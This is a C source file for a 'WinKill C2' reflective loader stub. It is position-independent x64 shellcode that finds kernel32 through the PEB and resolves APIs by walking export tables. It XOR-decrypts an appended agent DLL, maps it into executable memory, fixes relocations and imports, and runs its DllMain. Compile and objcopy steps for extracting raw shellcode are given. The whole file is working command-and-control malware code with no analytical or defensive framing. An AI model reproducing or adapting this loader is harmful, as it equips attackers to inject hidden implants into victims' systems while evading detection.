/*
 * WinKill C2 - Reflective Loader Stub (x64 PIC Shellcode)
 * =========================================================
 * ALL data on stack. No globals. Pure position-independent.
 *
 * Memory layout when injected:
 *   [this loader code][dll_size:4 LE][XOR-encrypted agent.dll]
 *
 * Compile:
 *   gcc -O2 -s -m64 -fPIC -fno-stack-protector -fno-asynchronous-unwind-tables
 *       -nostartfiles -Wl,--entry=ReflectiveLoader
 *       -o loader_stub.exe loader_stub.c -lkernel32
 *   objcopy -O binary -j .text loader_stub.exe loader.bin
 */

#include <windows.h>
#include <winternl.h>
#include <winnt.h>

/* ----- API types ----- */
typedef HMODULE (WINAPI *t_LL)(LPCSTR);
typedef FARPROC (WINAPI *t_GPA)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *t_VA)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *t_VF)(LPVOID, SIZE_T, DWORD);
typedef VOID    (WINAPI *t_EXIT)(DWORD);
typedef BOOL    (WINAPI *t_DM)(HINSTANCE, DWORD, LPVOID);

/* ----- Stack-based string compare ----- */
static int s_eq(const char *a, const char *b) {
    while (*a && *b) { if (*a++ != *b++) return 0; }
    return (*a == *b);
}

/* ----- Get kernel32 base via x64 PEB ----- */
static HMODULE K32(void) {
    PPEB peb;
    __asm__("mov %%gs:0x60, %0" : "=r"(peb));
    if (!peb || !peb->Ldr) return NULL;

    PLIST_ENTRY h = &peb->Ldr->InMemoryOrderModuleList;
    for (PLIST_ENTRY e = h->Flink; e != h; e = e->Flink) {
        PLDR_DATA_TABLE_ENTRY m = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (!m->DllBase) continue;
        PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)m->DllBase;
        if (d->e_magic != IMAGE_DOS_SIGNATURE) continue;
        PIMAGE_NT_HEADERS n = (PIMAGE_NT_HEADERS)((BYTE*)m->DllBase + d->e_lfanew);
        if (n->Signature != IMAGE_NT_SIGNATURE) continue;
        DWORD rva = n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (!rva) continue;
        PIMAGE_EXPORT_DIRECTORY x = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)m->DllBase + rva);
        char *nm = (char*)((BYTE*)m->DllBase + x->Name);
        if (nm[0]=='K' && nm[1]=='E' && nm[2]=='R') return (HMODULE)m->DllBase;
    }
    return NULL;
}

/* ----- GetProcAddress via export table walk ----- */
static FARPROC GPA(HMODULE h, const char *name) {
    PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)h;
    if (d->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS n = (PIMAGE_NT_HEADERS)((BYTE*)h + d->e_lfanew);
    if (n->Signature != IMAGE_NT_SIGNATURE) return NULL;
    DWORD rva = n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!rva) return NULL;
    PIMAGE_EXPORT_DIRECTORY x = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)h + rva);
    DWORD *f = (DWORD*)((BYTE*)h + x->AddressOfFunctions);
    DWORD *m = (DWORD*)((BYTE*)h + x->AddressOfNames);
    WORD  *o = (WORD*)((BYTE*)h + x->AddressOfNameOrdinals);
    for (DWORD i = 0; i < x->NumberOfNames; i++) {
        char *en = (char*)((BYTE*)h + m[i]);
        if (s_eq(name, en)) return (FARPROC)((BYTE*)h + f[o[i]]);
    }
    return NULL;
}

/* ----- XOR decrypt (key on stack) ----- */
static void XD(BYTE *d, DWORD n) {
    BYTE key[16] = {0x4A,0x7F,0x23,0x9C,0x11,0x8E,0x55,0x3D,
                    0x6B,0x12,0x89,0xFA,0x34,0xD7,0x01,0xCB};
    for (DWORD i = 0; i < n; i++) d[i] ^= key[i % 16];
}

/* ----- Reflective DLL loader ----- */
static HMODULE MapDLL(t_VA va, t_VF vf, t_LL ll, t_GPA gpa, BYTE *dll) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dll + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD imgSize = nt->OptionalHeader.SizeOfImage;
    BYTE *base = (BYTE*)va(NULL, imgSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) return NULL;

    // Copy headers
    DWORD hdrSz = nt->OptionalHeader.SizeOfHeaders;
    for (DWORD i = 0; i < hdrSz; i++) base[i] = dll[i];

    // Copy sections
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->SizeOfRawData) {
            BYTE *dst = base + sec->VirtualAddress;
            BYTE *src = dll + sec->PointerToRawData;
            DWORD sz = sec->SizeOfRawData;
            if (sz > sec->Misc.VirtualSize) sz = sec->Misc.VirtualSize;
            for (DWORD j = 0; j < sz; j++) dst[j] = src[j];
        }
    }

    // Apply base relocations
    LONG_PTR delta = (LONG_PTR)base - (LONG_PTR)nt->OptionalHeader.ImageBase;
    if (delta) {
        DWORD rrva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD rsz  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        if (rrva && rsz) {
            PIMAGE_BASE_RELOCATION rel = (PIMAGE_BASE_RELOCATION)(base + rrva);
            DWORD end = rrva + rsz;
            while ((DWORD)((BYTE*)rel - base) < end && rel->SizeOfBlock) {
                DWORD cnt = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD *ents = (WORD*)((BYTE*)rel + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD i = 0; i < cnt; i++) {
                    if (ents[i] >> 12 == IMAGE_REL_BASED_DIR64)
                        *(ULONG_PTR*)(base + rel->VirtualAddress + (ents[i] & 0xFFF)) += delta;
                }
                rel = (PIMAGE_BASE_RELOCATION)((BYTE*)rel + rel->SizeOfBlock);
            }
        }
    }

    // Resolve imports
    DWORD irva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (irva) {
        PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(base + irva);
        while (imp->Name) {
            char *mod = (char*)(base + imp->Name);
            HMODULE hm = ll(mod);
            if (!hm) { vf(base, 0, MEM_RELEASE); return NULL; }
            ULONG_PTR *thk = (ULONG_PTR*)(base + (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
            ULONG_PTR *iat = (ULONG_PTR*)(base + imp->FirstThunk);
            for (DWORD i = 0; thk[i]; i++) {
                if (thk[i] & IMAGE_ORDINAL_FLAG64)
                    iat[i] = (ULONG_PTR)gpa(hm, (const char*)(thk[i] & 0xFFFF));
                else {
                    PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)(base + thk[i]);
                    iat[i] = (ULONG_PTR)gpa(hm, (char*)ibn->Name);
                }
            }
            imp++;
        }
    }

    // Call DllMain
    t_DM dm = (t_DM)(base + nt->OptionalHeader.AddressOfEntryPoint);
    dm((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    return (HMODULE)base;
}

/* ----- ReflectiveLoader entry ----- */
__attribute__((section(".text$A")))
void ReflectiveLoader(void) {
    // Resolve kernel32 APIs
    HMODULE k32 = K32();
    if (!k32) return;

    t_GPA gpa = (t_GPA)GPA(k32, "GetProcAddress");
    if (!gpa) return;

    t_LL  ll = (t_LL)GPA(k32, "LoadLibraryA");
    t_VA  va = (t_VA)GPA(k32, "VirtualAlloc");
    t_VF  vf = (t_VF)GPA(k32, "VirtualFree");

    if (!va || !ll) return;

    // Find DLL data: scan past our code for the 4-byte size header
    BYTE *self = (BYTE *)ReflectiveLoader;
    BYTE *scan = self + 0x1000;  // Skip 4KB past entry (our code fits in 2KB)

    DWORD dllSize = *(DWORD*)scan;
    BYTE *encDll  = scan + 4;

    if (dllSize == 0 || dllSize > 50*1024*1024) return;

    // Decrypt DLL in-place
    XD(encDll, dllSize);

    // Map DLL from memory
    MapDLL(va, vf, ll, gpa, encDll);

    // Exit thread cleanly
    HMODULE ntdll = ll("ntdll.dll");
    if (ntdll) {
        t_EXIT exitFn = (t_EXIT)GPA(ntdll, "RtlExitUserThread");
        if (exitFn) exitFn(0);
    }
}

// No static data - everything on stack for true PIC
